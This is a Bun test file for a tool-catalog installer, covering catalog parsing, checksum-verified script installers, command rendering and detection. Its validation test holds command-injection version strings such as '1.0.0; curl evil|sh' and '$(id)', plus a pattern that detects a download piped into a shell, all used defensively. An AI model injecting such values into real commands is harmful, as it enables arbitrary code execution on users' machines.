import { describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { AppError } from "../src/lib/errors";
import { catalogSummary } from "../src/operations/tools";
import { desiredToolsOf, installEnv } from "../src/services/tools";
import { findCatalogEntry, loadCatalog, parseCatalogEntry, requireCatalogEntry } from "../src/tools/catalog";
import {
  assertSafeToolVersion,
  commandFor,
  detectCommand,
  packageSpec,
  renderCommand,
  resolveToolVersion,
  shellQuote,
} from "../src/tools/commands";
import { detectScript, parseDetectOutput } from "../src/tools/detect";
import { TOOL_CATEGORIES, type CatalogEntry } from "../src/tools/types";

const sample: CatalogEntry = {
  id: "claude-code",
  name: "Claude Code",
  description: "test",
  category: "agents",
  source: "npm",
  package: "@anthropic-ai/claude-code",
  bin: "claude",
  needsRoot: false,
  estimatedMb: 10,
  install: "npm install -g --prefix {{prefix}} {{package_spec}}",
  upgrade: "npm install -g --prefix {{prefix}} {{package_spec}}",
  uninstall: "npm uninstall -g --prefix {{prefix}} {{package}}",
  detect: "claude --version",
};

const emptyDataDir = () => mkdtempSync(join(tmpdir(), "mb-tools-empty-"));

function errorKey(fn: () => unknown): string | undefined {
  try {
    fn();
  } catch (e) {
    return e instanceof AppError ? e.key : undefined;
  }
  return undefined;
}

describe("tool catalog parse", () => {
  test("accepts a valid entry and rejects a bad id", () => {
    const entry = parseCatalogEntry({ ...sample, requires: "Node ≥ 20" }, "x.json");
    expect(entry.requires).toBe("Node ≥ 20");
    expect(() => parseCatalogEntry({ ...sample, id: "Bad_ID" }, "x.json")).toThrow(AppError);
  });

  test("checks the category, and files without one join the agents group", () => {
    for (const category of TOOL_CATEGORIES) {
      expect(parseCatalogEntry({ ...sample, category }, "x.json").category).toBe(category);
    }
    expect(() => parseCatalogEntry({ ...sample, category: "misc" }, "x.json")).toThrow(/unknown category misc/);
    const raw: Record<string, unknown> = { ...sample };
    delete raw.category;
    expect(parseCatalogEntry(raw, "x.json").category).toBe("agents");
    expect(() => parseCatalogEntry({ ...sample, category: 3 }, "x.json")).toThrow(AppError);
  });

  test("reads the optional stop command, and a blank one counts as absent", () => {
    expect(parseCatalogEntry({ ...sample, stop: " claude stop " }, "x.json").stop).toBe("claude stop");
    expect(parseCatalogEntry({ ...sample, stop: "   " }, "x.json").stop).toBeUndefined();
    expect(parseCatalogEntry(sample, "x.json").stop).toBeUndefined();
    expect(() => parseCatalogEntry({ ...sample, stop: ["claude", "stop"] }, "x.json")).toThrow(/stop must be a string/);
  });

  test("reads needsRoot and defaults it to false", () => {
    expect(parseCatalogEntry({ ...sample, needsRoot: true }, "x.json").needsRoot).toBe(true);
    const raw: Record<string, unknown> = { ...sample };
    delete raw.needsRoot;
    expect(parseCatalogEntry(raw, "x.json").needsRoot).toBe(false);
  });

  test("loads bundled catalog and overrides from DATA_DIR/tools.d", () => {
    const dataDir = mkdtempSync(join(tmpdir(), "mb-tools-"));
    const custom = join(dataDir, "tools.d");
    mkdirSync(custom);
    writeFileSync(
      join(custom, "claude-code.json"),
      JSON.stringify({
        ...sample,
        name: "Claude Code (custom)",
        description: "overridden",
      }),
    );
    writeFileSync(
      join(custom, "my-tool.json"),
      JSON.stringify({
        ...sample,
        id: "my-tool",
        name: "My Tool",
        category: "terminal",
        package: "my-tool",
        bin: "my-tool",
      }),
    );
    const catalog = loadCatalog(dataDir);
    expect(findCatalogEntry(catalog, "claude-code")?.name).toBe("Claude Code (custom)");
    expect(findCatalogEntry(catalog, "my-tool")?.bin).toBe("my-tool");
    expect(findCatalogEntry(catalog, "codex")).toBeTruthy();
  });
});

describe("bundled catalog", () => {
  const catalog = loadCatalog(emptyDataDir());

  test("every entry has a known category, and every group has at least one entry", () => {
    for (const entry of catalog) expect(TOOL_CATEGORIES).toContain(entry.category);
    expect(new Set(catalog.map((entry) => entry.category))).toEqual(new Set(TOOL_CATEGORIES));
  });

  test("the bundled catalog is exactly the reviewed list, so an addition or removal shows up in review", () => {
    expect(catalog.map((entry) => entry.id).toSorted()).toEqual([
      "antigravity",
      "bun",
      "claude-code",
      "codex",
      "fx",
      "gh",
      "grok",
      "herdr",
      "luvus",
      "oh-my-pi",
      "opencode",
      "pi-agent",
      "qoder",
      "rust",
      "tailscale",
      "uv",
      "zig",
    ]);
  });

  test("no bundled tool needs root, so every one installs as the dev user", () => {
    expect(catalog.filter((entry) => entry.needsRoot).map((entry) => entry.id)).toEqual([]);
    expect(requireCatalogEntry(catalog, "tailscale").needsRoot).toBe(false);
    expect(errorKey(() => requireCatalogEntry(catalog, "no-such-tool"))).toBe("tool_unknown");
  });

  test("script installers download over HTTPS and never pipe a download into a shell", () => {
    const scripts = catalog.filter((entry) => entry.source === "script");
    expect(scripts.length).toBeGreaterThan(0);
    for (const entry of scripts) {
      for (const template of [entry.install, entry.upgrade]) {
        expect(template, entry.id).not.toMatch(/http:\/\//);
        expect(template, entry.id).not.toMatch(/\|\s*(sudo\s+)?(ba)?sh\b/);
      }
    }
  });

  test("script installers take no version pin", () => {
    for (const entry of catalog.filter((item) => item.source === "script")) {
      expect(resolveToolVersion(entry, "latest")).toBe("latest");
      expect(
        errorKey(() => resolveToolVersion(entry, "1.0.0")),
        entry.id,
      ).toBe("tool_version_unsupported");
    }
  });

  test("catalog summary carries the category and the root flag for the create dialog", () => {
    const summary = catalogSummary(emptyDataDir());
    expect(summary.find((item) => item.id === "claude-code")).toMatchObject({ category: "agents", needsRoot: false });
    expect(summary.find((item) => item.id === "tailscale")).toMatchObject({ category: "networking", needsRoot: false });
  });
});

describe("tailscale catalog entry", () => {
  const entry = requireCatalogEntry(loadCatalog(emptyDataDir()), "tailscale");

  test("installs without root from the official tarball, checked against its published sha256 before extraction", () => {
    expect(entry).toMatchObject({ source: "script", needsRoot: false, bin: "tailscale", category: "networking" });
    expect(entry.install).toContain("base=https://pkgs.tailscale.com/stable\n");
    expect(entry.install).toContain('curl -fsSL "$base/?mode=json"');
    const checked = entry.install.indexOf("sha256sum -c");
    expect(checked).toBeGreaterThan(-1);
    expect(checked).toBeLessThan(entry.install.indexOf("tar -xzf"));
    expect(entry.install).toContain("x86_64 | amd64) arch=amd64");
    expect(entry.install).toContain("aarch64 | arm64) arch=arm64");
    expect(entry.install).not.toMatch(/\b(apt|apt-get|dpkg|sudo|systemctl)\b/);
  });

  test("requires explains userspace networking, the proxy, and what does not work", () => {
    expect(entry.requires).toContain("Userspace networking");
    // tailscaled's netstack forwards inbound TCP and UDP for the node's own tailnet IPs to 127.0.0.1.
    expect(entry.requires).toContain("Inbound TCP and UDP to the box's tailnet IP are forwarded to 127.0.0.1");
    expect(entry.requires).toContain("localhost:1055");
    expect(entry.requires).toContain("ALL_PROXY=socks5h://localhost:1055");
    expect(entry.requires).toContain("No ICMP");
    expect(entry.requires).toContain("after the box restarts or wakes");
  });

  test("upgrade re-runs the install, and uninstall removes both binaries and the wrapper", () => {
    expect(entry.upgrade).toBe(entry.install);
    for (const name of ["tailscale", "tailscaled", "minibox-tailscale"]) {
      expect(entry.uninstall).toContain(`{{prefix}}/bin/${name}`);
    }
  });

  test("stop runs the wrapper's stop command from the tools prefix, and detect stays a version probe", () => {
    expect(renderCommand(entry.stop ?? "", entry, { version: "latest" })).toBe(
      "/opt/minibox/tools/bin/minibox-tailscale stop",
    );
    expect(detectCommand(entry)).toBe("command -v tailscale >/dev/null && tailscale version 2>/dev/null");
  });

  test("the rendered install and uninstall parse as sh", () => {
    const dir = mkdtempSync(join(tmpdir(), "mb-tailscale-sh-"));
    try {
      for (const [name, template] of [
        ["install", entry.install],
        ["uninstall", entry.uninstall],
      ] as const) {
        const file = join(dir, `${name}.sh`);
        writeFileSync(file, renderCommand(template, entry, { version: "latest", prefix: dir }));
        expect({ name, exitCode: Bun.spawnSync(["sh", "-n", file]).exitCode }).toEqual({ name, exitCode: 0 });
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("gh catalog entry", () => {
  const entry = requireCatalogEntry(loadCatalog(emptyDataDir()), "gh");

  test("installs without root from the official release tarball, checked against its published sha256 before extraction", () => {
    expect(entry).toMatchObject({ source: "script", needsRoot: false, bin: "gh", category: "terminal" });
    expect(entry.install).toContain("base=https://github.com/cli/cli/releases\n");
    expect(entry.install).toContain("curl -fsSIL -o /dev/null -w '%{url_effective}' \"$base/latest\")");
    expect(entry.install).toContain("checksums.txt");
    const checked = entry.install.indexOf("sha256sum -c");
    expect(checked).toBeGreaterThan(-1);
    expect(checked).toBeLessThan(entry.install.indexOf("tar -xzf"));
    expect(entry.install).toContain("x86_64 | amd64) arch=amd64");
    expect(entry.install).toContain("aarch64 | arm64) arch=arm64");
    expect(entry.install).not.toMatch(/\b(api\.github\.com|apt|apt-get|dpkg|sudo|systemctl)\b/);
  });

  test("the rendered install and uninstall parse as sh", () => {
    const dir = mkdtempSync(join(tmpdir(), "mb-gh-sh-"));
    try {
      for (const [name, template] of [
        ["install", entry.install],
        ["uninstall", entry.uninstall],
      ] as const) {
        const file = join(dir, `${name}.sh`);
        writeFileSync(file, renderCommand(template, entry, { version: "latest", prefix: dir }));
        expect({ name, exitCode: Bun.spawnSync(["sh", "-n", file]).exitCode }).toEqual({ name, exitCode: 0 });
      }
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("tool command generation", () => {
  test("pins npm and pip package specs", () => {
    expect(packageSpec(sample, "latest")).toBe("@anthropic-ai/claude-code@latest");
    expect(packageSpec(sample, "1.2.3")).toBe("@anthropic-ai/claude-code@1.2.3");
    const pip: CatalogEntry = { ...sample, id: "pip-tool", source: "pip", package: "pip-tool-pkg", bin: "pip-tool" };
    expect(packageSpec(pip, "latest")).toBe("pip-tool-pkg");
    expect(packageSpec(pip, "0.80.0")).toBe("pip-tool-pkg==0.80.0");
  });

  test("rejects unsafe versions that would inject into sh -c", () => {
    const evil = "1.0.0; curl evil|sh";
    expect(() => assertSafeToolVersion(evil)).toThrow(AppError);
    expect(() => packageSpec(sample, evil)).toThrow(AppError);
    expect(() => commandFor(sample, "install", evil)).toThrow(AppError);
    expect(() => packageSpec(sample, "1.0.0$(id)")).toThrow(AppError);
    expect(() => packageSpec(sample, "1.0.0`id`")).toThrow(AppError);
    expect(() => packageSpec(sample, "1.0.0 && true")).toThrow(AppError);
    expect(() => packageSpec(sample, "1.0.0\ncurl evil")).toThrow(AppError);
    expect(assertSafeToolVersion("v1.2.3-beta.1")).toBe("v1.2.3-beta.1");
    expect(assertSafeToolVersion("  latest  ")).toBe("latest");
  });

  test("renders install, upgrade, uninstall and detect commands", () => {
    expect(commandFor(sample, "install", "latest")).toBe(
      "npm install -g --prefix /opt/minibox/tools @anthropic-ai/claude-code@latest",
    );
    expect(commandFor(sample, "uninstall", "latest")).toBe(
      "npm uninstall -g --prefix /opt/minibox/tools @anthropic-ai/claude-code",
    );
    expect(detectCommand(sample)).toBe("claude --version");
    expect(renderCommand("echo {{bin}} {{version}}", sample, { version: "2.0.0" })).toBe("echo claude 2.0.0");
  });

  test("a version pin on an npm entry passes through, and a script entry takes only latest", () => {
    expect(resolveToolVersion(sample, "1.4.0")).toBe("1.4.0");
    expect(resolveToolVersion(sample, "")).toBe("latest");
    const script: CatalogEntry = { ...sample, source: "script", package: "example.sh" };
    expect(resolveToolVersion(script, "")).toBe("latest");
    expect(() => resolveToolVersion(script, "1.4.0")).toThrow(AppError);
  });

  test("shellQuote keeps quotes, expansions and newlines literal in sh -c", () => {
    for (const value of ["plain", "it's", '$HOME `id` "x"', "a\nb"]) {
      const result = Bun.spawnSync({ cmd: ["sh", "-c", `printf '%s' ${shellQuote(value)}`], stdout: "pipe" });
      expect(result.stdout.toString()).toBe(value);
    }
  });
});

describe("detect script", () => {
  test("parses one record per entry and ignores other output", () => {
    const logs = [
      "shell: warning from the image",
      "MBTOOL\tclaude-code\t0\t1\t2.1.0 (Claude Code)",
      "MBTOOL\tcodex\t1\t0\t",
      "MBTOOL\tuv\t0\t0\t",
      "",
    ].join("\n");
    const found = parseDetectOutput(logs);
    expect(found.get("claude-code")).toEqual({
      installed: true,
      installedVersion: "2.1.0 (Claude Code)",
      managed: true,
    });
    expect(found.get("codex")).toEqual({ installed: false, installedVersion: null, managed: false });
    expect(found.get("uv")).toEqual({ installed: true, installedVersion: null, managed: false });
    expect(found.has("shell")).toBe(false);
  });

  test.skipIf(!Bun.which("timeout"))("runs each detect command in the PATH it is given", () => {
    const prefix = mkdtempSync(join(tmpdir(), "mb-tools-prefix-"));
    mkdirSync(join(prefix, "bin"));
    writeFileSync(
      join(prefix, "bin", "fake-tool"),
      '#!/bin/sh\nif [ "$1" = "--version" ]; then echo "fake-tool 9.8.7"; echo more; fi\n',
      { mode: 0o755 },
    );
    const present: CatalogEntry = {
      ...sample,
      id: "fake-tool",
      bin: "fake-tool",
      detect: "command -v fake-tool >/dev/null && fake-tool --version 2>/dev/null",
    };
    const absent: CatalogEntry = {
      ...sample,
      id: "absent-tool",
      bin: "absent-tool",
      detect: "command -v absent-tool >/dev/null && absent-tool --version 2>/dev/null",
    };
    const result = Bun.spawnSync({
      cmd: ["sh", "-c", detectScript([present, absent], prefix)],
      env: { ...process.env, PATH: `${join(prefix, "bin")}:${process.env.PATH ?? ""}` },
      stdout: "pipe",
      stderr: "pipe",
    });
    const found = parseDetectOutput(result.stdout.toString());
    expect(found.get("fake-tool")).toEqual({ installed: true, installedVersion: "fake-tool 9.8.7", managed: true });
    expect(found.get("absent-tool")).toEqual({ installed: false, installedVersion: null, managed: false });
  });
});

describe("install env", () => {
  test("sets PATH and npm/pip prefixes", () => {
    const env = installEnv();
    expect(env.some((line) => line.startsWith("PATH=") && line.includes("/opt/minibox/tools/bin"))).toBe(true);
    expect(env).toContain("NPM_CONFIG_PREFIX=/opt/minibox/tools");
    expect(env).toContain("PIP_CACHE_DIR=/tmp/pip-cache");
  });

  // Bun caches HTTP_PROXY for fetch; mutating process.env here would hang later HTTP tests.
  test("forwards HTTP_PROXY when set", () => {
    const script = [
      'import { installEnv } from "./src/services/tools.ts";',
      "const env = installEnv();",
      'if (!env.includes("HTTP_PROXY=http://proxy.example:8080")) process.exit(2);',
      'if (!env.some((line) => line.startsWith("PATH="))) process.exit(3);',
    ].join("");
    const result = Bun.spawnSync({
      cmd: ["bun", "-e", script],
      cwd: join(import.meta.dir, ".."),
      env: { ...process.env, HTTP_PROXY: "http://proxy.example:8080" },
      stdout: "pipe",
      stderr: "pipe",
    });
    expect(result.exitCode).toBe(0);
  });
});

describe("desiredToolsOf", () => {
  test("records latest and rejects unknown ids", () => {
    const catalog = loadCatalog(emptyDataDir());
    expect(desiredToolsOf(["claude-code", "claude-code"], catalog)).toEqual([{ id: "claude-code", version: "latest" }]);
    expect(() => desiredToolsOf(["no-such-tool"], catalog)).toThrow(AppError);
  });

  test("refuses a root-only tool when a box records it", () => {
    const rooted: CatalogEntry = { ...sample, id: "rooted", needsRoot: true };
    const catalog = [...loadCatalog(emptyDataDir()), rooted];
    expect(errorKey(() => desiredToolsOf(["rooted"], catalog))).toBe("tool_needs_root");
    expect(errorKey(() => requireCatalogEntry(catalog, "rooted"))).toBe("tool_needs_root");
  });
});
